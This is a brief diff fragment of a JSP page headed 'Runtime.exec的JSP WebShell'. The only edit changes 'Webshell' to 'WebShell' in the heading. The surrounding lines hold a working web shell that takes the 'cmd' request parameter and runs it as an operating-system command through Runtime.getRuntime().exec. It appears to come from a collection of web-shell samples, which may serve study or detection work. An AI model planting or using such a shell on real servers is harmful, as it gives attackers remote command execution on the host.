@@ -3,7 +3,7 @@
 <%@ page import="java.io.InputStreamReader" %>
 <html>
 <body>
-<h2>Runtime.exec的JSP Webshell</h2>
+<h2>Runtime.exec的JSP WebShell</h2>
 <%
     String s2 = request.getParameter("cmd");
     Process process = Runtime.getRuntime().exec(s2.split(" "));
